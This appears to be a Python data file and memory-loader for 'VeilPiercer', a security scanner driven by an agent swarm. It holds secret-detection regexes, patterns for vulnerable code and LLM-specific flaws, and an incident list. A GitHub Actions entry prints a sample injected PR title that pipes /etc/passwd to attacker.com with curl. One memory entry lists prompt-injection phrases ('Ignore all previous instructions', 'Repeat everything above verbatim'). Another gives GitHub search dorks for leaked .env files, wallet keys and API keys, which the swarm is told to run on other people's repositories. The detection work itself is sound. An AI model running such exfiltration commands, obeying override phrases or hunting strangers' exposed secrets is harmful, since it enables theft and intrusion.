# VeilPiercer Swarm Intelligence Training Data v1.0
# =====================================================
# Compiled from:
#   - gitleaks/gitleaks master config (real patterns used in production)
#   - TruffleHog detector research
#   - OWASP LLM Top 10 (2025)
#   - embracethered.com (Johann Rehberger — ASCII Smuggling, indirect injection)
#   - llmsecurity.net, portswigger.net/web-security/llm-attacks
#   - GitGuardian State of Secrets Sprawl 2025
#   - Socket.dev supply chain behavioral research
#   - Semgrep rule library + Bandit AST rules
#   - GitHub Advisory Database (LangChain CVEs, Anthropic MCP CVEs)
#   - Real-world incident reports ($47K loop, $305M WazirX, LLMjacking)
#
# Created by Lauren Flipo (@fliptrigga13) · https://veil-piercer.com
# =====================================================

SWARM_INTEL = {

    # ─── SECRET PATTERNS (from gitleaks, trufflehog, gitguardian) ────────────
    # These are the patterns the BEST tools in the world use.
    # Every SCOUT-LIVE and INTEL_SEEKER should know these.
    "secret_patterns": [
        # OpenAI
        {"id": "openai-api-key",        "regex": r"sk-[a-zA-Z0-9]{40,}",                              "severity": "CRITICAL", "entropy_min": 4.5},
        {"id": "openai-project-key",    "regex": r"sk-proj-[a-zA-Z0-9_\-]{50,}",                      "severity": "CRITICAL"},
        # Anthropic
        {"id": "anthropic-api-key",     "regex": r"sk-ant-api03-[a-zA-Z0-9_\-]{93}AA",                "severity": "CRITICAL"},
        {"id": "anthropic-admin-key",   "regex": r"sk-ant-admin01-[a-zA-Z0-9_\-]{93}AA",              "severity": "CRITICAL"},
        # AWS
        {"id": "aws-access-key-id",     "regex": r"(?:A3T[A-Z0-9]|AKIA|ASIA|ABIA|ACCA)[A-Z2-7]{16}", "severity": "CRITICAL"},
        {"id": "aws-secret-key",        "regex": r"(?i)aws.{0,20}['\"][0-9a-zA-Z/+=]{40}['\"]",       "severity": "CRITICAL"},
        # GitHub
        {"id": "github-pat",            "regex": r"ghp_[0-9a-zA-Z]{36}",                              "severity": "CRITICAL"},
        {"id": "github-fine-grained",   "regex": r"github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}",       "severity": "CRITICAL"},
        {"id": "github-oauth",          "regex": r"gho_[0-9a-zA-Z]{36}",                              "severity": "CRITICAL"},
        {"id": "github-app",            "regex": r"ghs_[0-9a-zA-Z]{36}",                              "severity": "CRITICAL"},
        # Google
        {"id": "google-api-key",        "regex": r"AIza[0-9A-Za-z\-_]{35}",                           "severity": "CRITICAL"},
        # Stripe
        {"id": "stripe-secret",         "regex": r"sk_live_[0-9a-zA-Z]{24}",                          "severity": "CRITICAL"},
        {"id": "stripe-restricted",     "regex": r"rk_live_[0-9a-zA-Z]{24}",                          "severity": "CRITICAL"},
        # SendGrid
        {"id": "sendgrid",              "regex": r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}",         "severity": "CRITICAL"},
        # Slack
        {"id": "slack-bot-token",       "regex": r"xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}",         "severity": "CRITICAL"},
        {"id": "slack-webhook",         "regex": r"https://hooks\.slack\.com/services/T[a-zA-Z0-9]+/B[a-zA-Z0-9]+/[a-zA-Z0-9]+", "severity": "CRITICAL"},
        # HuggingFace
        {"id": "huggingface-token",     "regex": r"hf_[a-zA-Z]{34}",                                  "severity": "CRITICAL"},
        # Solana (CRITICAL for crypto repos)
        {"id": "solana-private-key-b58","regex": r"[1-9A-HJ-NP-Za-km-z]{87,88}",                      "severity": "CRITICAL", "context_required": ["private", "key", "wallet", "secret"], "note": "Base58 Solana keypair"},
        {"id": "solana-keypair-json",   "regex": r"\[(?:\d{1,3},){31}\d{1,3}\]",                      "severity": "CRITICAL", "note": "Solana keypair JSON array format"},
        # Private Keys
        {"id": "pem-private-key",       "regex": r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----", "severity": "CRITICAL"},
        # Databricks
        {"id": "databricks-token",      "regex": r"dapi[a-f0-9]{32}(?:-\d)?",                          "severity": "CRITICAL"},
        # DigitalOcean
        {"id": "digitalocean-pat",      "regex": r"dop_v1_[a-f0-9]{64}",                              "severity": "CRITICAL"},
        {"id": "digitalocean-oauth",    "regex": r"doo_v1_[a-f0-9]{64}",                              "severity": "CRITICAL"},
        # Generic high-entropy patterns
        {"id": "generic-secret",        "regex": r"""(?:password|passwd|secret|api_key|token)\s*[:=]\s*["']([A-Za-z0-9+/=_\-]{12,})["']""",
                                        "severity": "HIGH", "entropy_min": 3.5,
                                        "false_positive_indicators": ["os.environ", "process.env", "os.getenv", "secrets.token", "getenv", "config.get", "settings.", "parsed.", "token_urlsafe", "uuid", "random."]},
    ],

    # ─── DANGEROUS CODE PATTERNS ─────────────────────────────────────────────
    "dangerous_code_patterns": [
        # Code execution
        {"pattern": r"subprocess\.(?:run|Popen|call|check_output)\([^)]*shell\s*=\s*True",  "severity": "CRITICAL", "title": "subprocess shell=True — command injection"},
        {"pattern": r"\bos\.system\s*\(",                                                   "severity": "HIGH",     "title": "os.system() — use subprocess instead"},
        {"pattern": r"\bpickle\.loads?\s*\(",                                               "severity": "HIGH",     "title": "pickle.load() — RCE if data untrusted"},
        {"pattern": r"\byaml\.load\s*\([^,)]+\)(?!\s*,\s*Loader)",                        "severity": "HIGH",     "title": "yaml.load() without SafeLoader — RCE"},
        {"pattern": r"ssl\._create_unverified_context|CERT_NONE",                          "severity": "CRITICAL", "title": "SSL certificate validation disabled"},
        {"pattern": r"verify\s*=\s*False",                                                  "severity": "HIGH",     "title": "SSL verify=False — MITM vulnerability"},
        # Django/Flask misconfigs
        {"pattern": r"DEBUG\s*=\s*True",                                                    "severity": "HIGH",     "title": "DEBUG=True — never deploy to production"},
        {"pattern": r"ALLOWED_HOSTS\s*=\s*\[\s*['\*]['\s]*\]",                            "severity": "HIGH",     "title": "ALLOWED_HOSTS=['*'] — host header attacks"},
        {"pattern": r"SECRET_KEY\s*=\s*['\"][^'\"]{8,}['\"]",                             "severity": "CRITICAL", "title": "Django SECRET_KEY hardcoded"},
        # Node.js / Express
        {"pattern": r"cors\(\s*\{\s*origin\s*:\s*['\*]['\s]*\}",                          "severity": "MEDIUM",   "title": "CORS wildcard — allows any origin"},
        {"pattern": r"Access-Control-Allow-Origin.*\*",                                    "severity": "MEDIUM",   "title": "CORS wildcard header"},
        {"pattern": r"origin\s*:\s*function\s*\([^)]*\)\s*\{\s*(?:cb|callback)\(null,\s*origin\)", "severity": "HIGH", "title": "CORS origin reflection — blind mirror"},
        {"pattern": r"require\s*\(['\"]child_process['\"]\)",                             "severity": "HIGH",     "title": "child_process — check for command injection"},
        {"pattern": r"\.innerHTML\s*=(?!=)",                                               "severity": "MEDIUM",   "title": "innerHTML assignment — XSS vector"},
        {"pattern": r"dangerouslySetInnerHTML",                                            "severity": "MEDIUM",   "title": "React dangerouslySetInnerHTML — XSS risk"},
        {"pattern": r"document\.write\s*\(",                                               "severity": "MEDIUM",   "title": "document.write() — XSS risk"},
        {"pattern": r"new Function\s*\(",                                                  "severity": "HIGH",     "title": "new Function() — eval equivalent"},
        # Crypto
        {"pattern": r"Math\.random\s*\(\).*(?:key|token|secret|nonce|salt)",              "severity": "HIGH",     "title": "Math.random() for security token — not cryptographic"},
        {"pattern": r"hashlib\.md5|hashlib\.sha1",                                         "severity": "MEDIUM",   "title": "Weak hash (MD5/SHA1) — use SHA-256+"},
        # Dead code
        {"pattern": r"//\s*TODO:.*admin|//\s*TODO:.*auth|//\s*TODO:.*security",           "severity": "HIGH",     "title": "TODO: security/auth functionality not implemented"},
        {"pattern": r"raise NotImplementedError|throw new Error\(['\"]Not implemented",   "severity": "MEDIUM",   "title": "Unimplemented stub — will crash at runtime"},
    ],

    # ─── LLM-SPECIFIC VULNERABILITY PATTERNS ─────────────────────────────────
    # What no other tool checks for. This is VeilPiercer's competitive edge.
    "llm_vulnerabilities": [
        {
            "id": "langchain-experimental-import",
            "description": "langchain-experimental is NOT SAFE for production",
            "pattern": r"from langchain_experimental|import langchain_experimental",
            "severity": "CRITICAL",
            "detail": "langchain-experimental contains PALChain (CVE-2023-44467: exec() RCE), SymbolicMathChain (CVE-2024-46946: eval() RCE), VectorSQLDatabaseChain (CVE-2024-21513: eval() RCE). Never use in production.",
            "cves": ["CVE-2024-46946", "CVE-2023-44467", "CVE-2024-21513"],
        },
        {
            "id": "langchain-cypher-chain",
            "description": "GraphCypherQAChain — SQL/Cypher injection via prompt",
            "pattern": r"GraphCypherQAChain|VectorSQLDatabaseChain",
            "severity": "CRITICAL",
            "detail": "CVE-2024-8309: Prompt injection → unauthorized Neo4j/DB queries. LLM-generated Cypher/SQL executed without parameterization.",
            "cves": ["CVE-2024-8309"],
        },
        {
            "id": "llm-eval-on-output",
            "description": "eval()/exec() called on LLM-generated output",
            "pattern": r"eval\s*\(\s*(?:llm|model|response|output|completion|result)",
            "severity": "CRITICAL",
            "detail": "RCE: attacker controls LLM output → arbitrary code executes on your server. Same vector as CVE-2024-46946.",
        },
        {
            "id": "allow-dangerous-requests",
            "description": "allow_dangerous_requests=True in LangChain",
            "pattern": r"allow_dangerous_requests\s*=\s*True",
            "severity": "HIGH",
            "detail": "Disables LangChain's safety guardrails. Any external input can now reach unsafe execution paths.",
        },
        {
            "id": "no-max-iterations",
            "description": "Agent loop without iteration limit",
            "pattern": r"while\s+(?:True|true)",
            "severity": "HIGH",
            "fp_check": "max_iter|max_step|max_turn|break|timeout|BUDGET",
            "detail": "Real incident: $47,000 API bill from 11-day infinite verification loop. Add MAX_ITERATIONS and BUDGET_CAP_USD.",
        },
        {
            "id": "no-rate-limit-on-ai-endpoint",
            "description": "AI chat endpoint with no rate limiting",
            "pattern": r"(?:app|router)\.(?:post|get)\s*\(['\"](?:/api/chat|/chat|/completion|/generate|/ask)['\"]",
            "severity": "HIGH",
            "fp_check": "rateLimit|rate_limit|throttle|limiter",
            "detail": "Unprotected AI endpoint. Anyone can drain your API budget. Add express-rate-limit or equivalent.",
        },
        {
            "id": "prompt-string-concat",
            "description": "Prompt built by string concatenation (injection risk)",
            "pattern": r"(?:prompt|system_prompt|messages)\s*[+=]\s*(?:f['\"]|['\"].*\+.*user|str\()",
            "severity": "MEDIUM",
            "fp_check": "sanitize|escape|strip|validate",
            "detail": "Direct prompt injection: attacker input can override system instructions. Use <untrusted_data> markers or separate system/user turns.",
        },
        {
            "id": "next-public-api-key",
            "description": "NEXT_PUBLIC_ prefix exposes key to browser bundle",
            "pattern": r"NEXT_PUBLIC_(?:OPENAI|ANTHROPIC|CLAUDE|GPT|AI|API)[_A-Z]*",
            "severity": "CRITICAL",
            "detail": "NEXT_PUBLIC_ variables are bundled into client-side JavaScript. Your API key is public to anyone who views source.",
        },
        {
            "id": "no-human-in-loop-irreversible",
            "description": "Irreversible action (financial/delete/deploy) without approval gate",
            "pattern": r"(?:transfer|send|withdraw|delete|drop|truncate|deploy|rm -rf).*(?:agent\.run|agent\.execute|llm\(|chain\.run)",
            "severity": "HIGH",
            "detail": "Agent can autonomously execute irreversible actions. Add human-in-the-loop confirmation before financial transactions, deletions, or deployments.",
        },
        {
            "id": "multi-agent-no-trust-verification",
            "description": "Multi-agent system with no message verification",
            "pattern": r"(?:agent_?\d+|orchestrator|supervisor).*(?:execute|run|handle)\s*\(\s*(?:message|output|result)",
            "severity": "HIGH",
            "fp_check": "verify|validate|authenticate|sign|hmac",
            "detail": "Agent A trusts Agent B's output without verification. If Agent B is prompt-injected, attacker controls your entire pipeline.",
        },
        {
            "id": "ascii-smuggling-risk",
            "description": "User content processed without Unicode sanitization",
            "pattern": r"(?:email|document|pdf|url|webpage).*(?:llm|model|prompt|messages)\s*\+",
            "severity": "MEDIUM",
            "detail": "ASCII Smuggling (EmbraceTheRed technique): Unicode Tags Block chars (U+E0000–U+E007F) are invisible to humans but readable by LLMs. Attackers embed hidden instructions in emails/PDFs. Sanitize with unicodedata.category() filtering.",
        },
    ],

    # ─── GITHUB ACTIONS VULNERABILITIES ──────────────────────────────────────
    "workflow_vulnerabilities": [
        {
            "id": "expression-injection",
            "description": "Attacker-controlled data in run: step via ${{ github.event.* }}",
            "pattern": r"\$\{\{[^}]*github\.event\.(?:pull_request\.(?:title|body|head\.ref|head\.label)|issue\.(?:title|body)|comment\.body|review\.body|commits\[|head_commit\.(?:message|author))[^}]*\}\}",
            "injected_in": "run:",
            "severity": "CRITICAL",
            "detail": "Pwn Request / expression injection: attacker creates PR with malicious title ';\\ curl attacker.com/$(cat /etc/passwd | base64)\\n#'. Use env: block instead.",
            "fix": "Set env var from ${{ github.event.X }}, use the env var in run: step.",
        },
        {
            "id": "pull-request-target-with-checkout",
            "description": "pull_request_target + checkout = code from fork runs with write permissions",
            "pattern": r"pull_request_target",
            "severity": "CRITICAL",
            "detail": "pull_request_target runs in parent repo context (has secrets). If combined with actions/checkout of the PR branch, attacker fork code runs with your secrets.",
        },
        {
            "id": "unpinned-action",
            "description": "GitHub Action pinned to mutable ref instead of commit hash",
            "pattern": r"uses:\s+[^\s@]+@(?:main|master|latest|v\d+)$",
            "severity": "MEDIUM",
            "detail": "Mutable tag means a compromised action repo can inject malicious code. Pin to commit SHA: actions/checkout@b4ffde65...",
        },
        {
            "id": "no-permissions-block",
            "description": "Workflow missing permissions: block",
            "pattern": "ABSENCE_CHECK",
            "check_for": "permissions:",
            "severity": "MEDIUM",
            "detail": "Without explicit permissions, GitHub uses permissive defaults. Add permissions: read-all at workflow level, grant only what's needed per job.",
        },
        {
            "id": "secret-in-run-step",
            "description": "GitHub secret passed directly to shell run: command",
            "pattern": r"run:.*\$\{\{.*secrets\.",
            "severity": "HIGH",
            "detail": "Secrets in run: steps can be leaked in logs if any command echoes them. Use env: block to pass secrets as environment variables.",
        },
    ],

    # ─── SUPPLY CHAIN INDICATORS ──────────────────────────────────────────────
    "supply_chain_risks": [
        {
            "id": "install-hook-script",
            "description": "package.json has preinstall/postinstall hook",
            "check": "package.json scripts.preinstall or postinstall",
            "severity": "HIGH",
            "detail": "Install hooks execute automatically on npm install. Malicious packages use this to exfiltrate env vars, .env files, ~/.aws/credentials.",
        },
        {
            "id": "no-scope-lock-npmrc",
            "description": "Private npm registry without scope locking",
            "check": ".npmrc has registry= but no @scope:registry=",
            "severity": "MEDIUM",
            "detail": "Without scope locking, npm falls back to public registry if private fails. Dependency confusion attack vector.",
        },
        {
            "id": "pip-extra-index-dangerous",
            "description": "requirements.txt uses extra-index-url alongside private registry",
            "check": "extra-index-url in pip.conf or requirements",
            "severity": "MEDIUM",
            "detail": "pip checks BOTH registries and installs highest version number. Attacker publishes your internal package name at v99.0.0 to public PyPI.",
        },
    ],

    # ─── REAL WORLD INCIDENTS (swarm should reference these when writing reports) ─
    "incident_database": [
        {"name": "EchoLeak", "cve": "CVE-2025-32711", "year": 2025, "impact": "Zero-click data exfiltration from M365 Copilot", "vector": "Indirect prompt injection via crafted emails"},
        {"name": "LangGrinch", "cve": "CVE-2025-68664", "year": 2025, "impact": "Prompt injection → deserialization RCE in langchain-core"},
        {"name": "LangChain GraphCypher", "cve": "CVE-2024-8309", "year": 2024, "impact": "SQL/Cypher injection via LLM output", "vector": "Prompt injection → unauthorized Neo4j queries"},
        {"name": "LangChain SymbolicMath", "cve": "CVE-2024-46946", "year": 2024, "impact": "RCE via eval()", "vector": "sympy.sympify calls eval() on LLM output"},
        {"name": "LangChain PAL", "cve": "CVE-2023-44467", "year": 2023, "impact": "RCE via exec()", "vector": "PALChain executes LLM-generated Python"},
        {"name": "Anthropic Git MCP", "cve": "CVE-2025-68143", "year": 2025, "impact": "Argument injection, path bypass, unapproved code execution"},
        {"name": "$47K infinite loop", "cve": None, "year": 2025, "impact": "$47,000 API bill", "vector": "Two agents in 11-day verification loop, no kill switch"},
        {"name": "$12K K8s spawner", "cve": None, "year": 2025, "impact": "$12,000 infrastructure bill", "vector": "Agent misread failures as capacity issues, spawned clusters indefinitely"},
        {"name": "WazirX hack", "cve": None, "year": 2024, "impact": "$235M crypto theft", "vector": "Private key compromise"},
        {"name": "DMM Bitcoin hack", "cve": None, "year": 2024, "impact": "$305M crypto theft", "vector": "Private key compromise"},
        {"name": "LLMjacking epidemic", "cve": None, "year": 2024, "impact": "$50K+ API bills per victim", "vector": "Stolen OpenAI/Anthropic keys used for attacker inference"},
        {"name": "GitHub Copilot autoApprove", "cve": "CVE-2025-53773", "year": 2025, "impact": "AI approved commands without consent", "vector": "Injection modified VSCode settings"},
    ],

    # ─── WHAT THE SWARM SHOULD LOOK FOR ON GITHUB ────────────────────────────
    # Intel for SCOUT-LIVE agent: what signals = real pain = VeilPiercer prospect
    "scout_signals": {
        "high_value_keywords": [
            # Direct pain signals
            "agent crashed", "ran out of API credits", "infinite loop", "out of money",
            "hit rate limit", "RateLimitError", "429", "context window exceeded",
            "my bot got hacked", "api key exposed", "private key stolen",
            "accidentally committed", "git history", "secret in git",
            "hallucinating", "wrong tool called", "agent did something wrong",
            "no way to replay", "can't debug", "lost state",
            # LLM framework pain
            "langchain broken", "langgraph state loss", "crewai bug",
            "autogpt failed", "agent loop", "agent spending money",
            # Crypto agent pain (HIGH VALUE — Solana/ETH wallets at risk)
            "trading bot hacked", "wallet drained", "bot drained my wallet",
            "solana bot security", "private key bot",
        ],
        "target_repo_signals": [
            # These repo patterns = likely has VeilPiercer-fixable issues
            "mineflayer", "eliza", "elizaos", "langchain", "crewai", "autogpt",
            "langgraph", "openai", "anthropic", "ollama", "trading-bot", "solana-bot",
            "telegram-bot", "discord-bot ai", "autonomous agent", "ai agent",
        ],
        "github_search_queries": [
            "is:issue label:bug langchain agent",
            "is:issue is:open langgraph state loss",
            "is:issue is:open rate limit openai agent",
            "is:issue api key exposed site:github.com",
            "is:issue autonomous agent infinite loop",
            "is:issue solana bot private key",
            "is:issue mineflayer crashed production",
            "is:issue crewai agent bug",
            "filename:.env extension:env private_key OR api_key",
            "extension:json filename:wallet private_key",
        ],
        "twitter_x_search_queries": [
            "langchain bug -filter:retweets",
            "my ai agent crashed -filter:retweets",
            "ran out of api credits agent",
            "openai rate limit agent loop",
            "solana bot hacked drained",
            "LLM agent infinite loop",
        ],
        "reddit_search_queries": [
            "site:reddit.com langchain issue help",
            "site:reddit.com ai agent spending too much money",
            "site:reddit.com ollama agent crash",
            "site:reddit.com telegram trading bot hacked",
        ],
    },

    # ─── HOW TO WRITE BETTER AUDIT REPORTS ───────────────────────────────────
    "report_guidelines": {
        "severity_criteria": {
            "CRITICAL": "Leads directly to: RCE, credential theft, financial loss, crypto wallet drain. Must be fixed before any deployment.",
            "HIGH": "Likely leads to: service disruption, data breach, significant money loss, auth bypass. Fix within 24 hours.",
            "MEDIUM": "Degrades reliability or security posture. Enables escalation chains. Fix in next sprint.",
            "LOW": "Code quality, maintainability, documentation gaps. Fix when convenient.",
        },
        "evidence_requirements": {
            "CRITICAL": "Must include: exact file path, line number, actual code snippet (redacted if key), fix command",
            "HIGH": "Must include: file path, line number, code pattern, concrete fix",
            "MEDIUM": "Must include: file path, description of pattern",
            "LOW": "Description sufficient",
        },
        "false_positive_filters": {
            "env_reads": ["os.environ", "process.env", "os.getenv", "config.get", "settings.", "parsed.", "getenv", "environ.get"],
            "secure_generators": ["secrets.token", "uuid.uuid", "random.SystemRandom", "token_urlsafe", "token_hex", "generate_password", "get_random_string"],
            "test_context": ["_test.py", "test_", "spec.ts", ".test.js", "mock", "fixture", "example", "sample"],
            "safe_exec": [r"regex\.exec\(", r"RegExp.*\.exec\(", r"/.*/.exec\("],
        },
        "veilpiercer_solutions": {
            "No error handling on LLM calls": "Use veilpiercer.Tracer to auto-capture all LLM call failures",
            "No retry/backoff": "VeilPiercer Tracer includes exponential backoff",
            "State loss between agent steps": "Use veilpiercer.StateGuard for persistent checkpointing",
            "Agent hallucinating": "Use veilpiercer.HallucinationDetector",
            "Session integrity": "Use veilpiercer.SessionIntegrity for HMAC-signed context",
            "No audit trail": "VeilPiercer TimeMachine logs and replays all agent decisions",
        },
    },
}


# ─── Inject into swarm memory (nexus_mind.db) ────────────────────────────────

def inject_into_swarm_memory(db_path: str = None):
    """
    Writes this intelligence directly into the swarm's SQLite memory.
    Every SCOUT-LIVE, INTEL_SEEKER, and CRITIC will have access to this.
    Schema: content, tags, importance, tier, agent, created_at, updated_at, archived
    """
    import sqlite3, json, os
    from datetime import datetime

    if db_path is None:
        candidates = [
            r"C:\Users\fyou1\nexus_mind.db",
            r"C:\Users\fyou1\nexus-ultra\nexus_mind.db",
            r"C:\Users\fyou1\projects\nexus_mind.db",
        ]
        db_path = next((p for p in candidates if os.path.exists(p)), None)
        if not db_path:
            print("[VeilPiercer Training] Could not locate nexus_mind.db. Pass path manually.")
            return False

    print(f"[VeilPiercer Training] Injecting into {db_path}...")
    now = datetime.utcnow().isoformat()
    conn = sqlite3.connect(db_path)
    c = conn.cursor()

    entries = [
        # content, tags, importance, tier, agent, created_at, updated_at, archived
        (
            f"SECRET_PATTERNS (gitleaks+trufflehog quality, {len(SWARM_INTEL['secret_patterns'])} patterns): " + json.dumps(SWARM_INTEL['secret_patterns']),
            "security,secrets,training,veilpiercer", 9.5, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            f"DANGEROUS_CODE_PATTERNS ({len(SWARM_INTEL['dangerous_code_patterns'])} patterns): " + json.dumps(SWARM_INTEL['dangerous_code_patterns']),
            "security,code,training,veilpiercer", 9.0, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            f"LLM_VULNERABILITIES ({len(SWARM_INTEL['llm_vulnerabilities'])} CVE-backed patterns): " + json.dumps(SWARM_INTEL['llm_vulnerabilities']),
            "llm,security,cve,training,veilpiercer", 9.5, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            f"GITHUB_ACTIONS_VULNS ({len(SWARM_INTEL['workflow_vulnerabilities'])} patterns): " + json.dumps(SWARM_INTEL['workflow_vulnerabilities']),
            "cicd,security,github-actions,training", 8.5, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            f"SUPPLY_CHAIN_RISKS: " + json.dumps(SWARM_INTEL['supply_chain_risks']),
            "supply-chain,npm,pypi,training", 8.0, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            f"REAL_WORLD_INCIDENTS ({len(SWARM_INTEL['incident_database'])} incidents): " + json.dumps(SWARM_INTEL['incident_database']),
            "incidents,cve,training,veilpiercer", 9.0, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            f"SCOUT_SIGNALS — keywords and queries to find prospects: " + json.dumps(SWARM_INTEL['scout_signals']),
            "scout,search,prospects,training,veilpiercer", 9.5, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            f"REPORT_GUIDELINES — how to write audit reports: " + json.dumps(SWARM_INTEL['report_guidelines']),
            "reporting,guidelines,training,veilpiercer", 8.0, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            "CRITICAL ALERT: langchain-experimental is NOT safe for production. Contains PALChain (CVE-2023-44467: exec RCE), "
            "SymbolicMathChain (CVE-2024-46946: eval RCE via sympy.sympify), VectorSQLDatabaseChain (CVE-2024-21513: eval RCE). "
            "ANY repo importing langchain_experimental must be flagged CRITICAL immediately.",
            "critical,cve,langchain,training,veilpiercer", 10.0, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            "CRITICAL STATS (GitGuardian 2025): 23.8 MILLION secrets leaked on GitHub in 2024 (+25% YoY). "
            "70% still valid 2+ years after exposure (zombie leaks). AI service keys grew +81%. "
            "DeepSeek keys: 113,000+ leaked in 2025. Solana keypair JSON arrays drained in <5 minutes of push. "
            "LLMjacking victims face $10K-$50K+ API bills per incident.",
            "statistics,secrets,training,veilpiercer", 9.5, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            "FINANCIAL RISK OF INFINITE LOOPS: $47,000 API bill (11-day verification loop between 2 agents, no kill switch). "
            "$12,000 infrastructure bill (agent spawned K8s clusters indefinitely). "
            "EVERY agent repo without MAX_ITERATIONS, BUDGET_CAP_USD, and circuit breaker is an active financial liability. "
            "VeilPiercer TimeMachine + StateGuard prevents this.",
            "cost,loops,agents,training,veilpiercer", 9.5, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            "PROMPT INJECTION TECHNIQUES (from embracethered.com / OWASP LLM Top 10): "
            "1) Direct injection: 'Ignore all previous instructions'. "
            "2) Indirect injection: malicious instructions in emails/PDFs/URLs agent retrieves. "
            "3) ASCII Smuggling: Unicode Tags Block U+E0000-U+E007F invisible to humans but readable by LLM — hidden payloads. "
            "4) System prompt extraction: 'Repeat everything above verbatim'. "
            "5) RAG poisoning: inject malicious docs into vector DB, agent retrieves and executes them. "
            "Repos to flag: no <untrusted_data> markers, no content sanitization before prompt injection.",
            "prompt-injection,llm,security,training,veilpiercer", 9.0, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            "GITHUB SEARCH DORKS for finding exposed secrets: "
            "'filename:.env extension:env PRIVATE_KEY' | "
            "'filename:wallet.json private_key' | "
            "'extension:json filename:keypair' | "
            "'sk-proj- extension:js' | "
            "'OPENAI_API_KEY= extension:env' | "
            "'anthropic api_key extension:py NOT example NOT test' | "
            "'solana mnemonic extension:js'. "
            "These are the same queries hackers use — your swarm should use them to find at-risk repos to audit.",
            "dorks,search,secrets,training,veilpiercer", 9.0, "semantic", "SWARM_INTEL", now, now, 0
        ),
        (
            "VEILPIERCER COMPETITIVE POSITIONING: "
            "What VeilPiercer does that no other tool does: "
            "1) LLM-specific patterns (infinite loops, no retry, prompt injection, stateless agents). "
            "2) Commit history secret scanning (secrets removed but still in git). "
            "3) OSV.dev CVE check on all dependencies. "
            "4) GitHub Issues analysis (real user bug reports). "
            "5) Python AST analysis (bare excepts, mutable defaults, syntax errors). "
            "6) Context-aware secret detection (zero false positives from env reads). "
            "7) Signed audit report posted as GitHub Issue with @fliptrigga13 / veil-piercer.com attribution. "
            "pip install veilpiercer | github.com/fliptrigga13/VEILPIERCER | veil-piercer.com",
            "positioning,marketing,veilpiercer,training", 9.5, "semantic", "SWARM_INTEL", now, now, 0
        ),
    ]

    c.executemany(
        "INSERT INTO memories (content, tags, importance, tier, agent, created_at, updated_at, archived) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        entries
    )
    conn.commit()
    conn.close()

    print(f"[VeilPiercer Training] SUCCESS. Injected {len(entries)} intelligence blocks into swarm memory.")
    print(f"  Secret patterns     : {len(SWARM_INTEL['secret_patterns'])} (gitleaks/trufflehog quality)")
    print(f"  Dangerous patterns  : {len(SWARM_INTEL['dangerous_code_patterns'])}")
    print(f"  LLM vulnerabilities : {len(SWARM_INTEL['llm_vulnerabilities'])} (CVE-backed)")
    print(f"  Workflow attacks    : {len(SWARM_INTEL['workflow_vulnerabilities'])}")
    print(f"  Real incidents      : {len(SWARM_INTEL['incident_database'])}")
    print(f"  Scout keywords      : {len(SWARM_INTEL['scout_signals']['high_value_keywords'])}")
    print(f"  GitHub search queries: {len(SWARM_INTEL['scout_signals']['github_search_queries'])}")
    print(f"")
    print(f"  Your swarm is now trained. Run nexus_swarm_loop.py to activate.")
    return True



if __name__ == "__main__":
    inject_into_swarm_memory()
